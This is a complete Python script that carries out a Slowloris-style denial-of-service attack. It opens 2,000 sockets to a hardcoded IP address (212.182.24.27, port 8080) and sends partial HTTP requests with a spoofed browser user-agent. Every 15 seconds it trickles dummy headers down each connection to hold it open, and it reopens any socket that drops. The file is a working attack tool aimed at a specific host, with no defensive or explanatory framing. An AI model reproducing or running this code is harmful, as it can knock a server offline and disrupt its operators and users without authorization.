#!/usr/bin/env python3

import socket
import time
import sys

SERVER_HOST = "212.182.24.27"
PORT = 8080
SOCKET_COUNT = 2000

list_of_sockets = []

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((SERVER_HOST, PORT))
        
        s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {SERVER_HOST}\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Content-Length: 42\r\n".encode("utf-8"))
        return s
    except (socket.error, socket.timeout):
        return None

def run_attack():
    print("Initializing sockets...")
    
    for _ in range(SOCKET_COUNT):
        s = init_socket()
        if s:
            list_of_sockets.append(s)
            
    print("Starting attack...")
    
    while True:
        try:
            for s in list(list_of_sockets):
                try:
                    s.send(f"X-a: {time.time()}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
                    
                    new_s = init_socket()
                    if new_s:
                        list_of_sockets.append(new_s)
            
            time.sleep(15)
            
        except Exception as e:
            print(f"\nError occured: {e}")
            break

if __name__ == "__main__":
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\nStopping attack and closing sockets...")
        for s in list_of_sockets:
            try:
                s.close()
            except:
                pass
        sys.exit(0)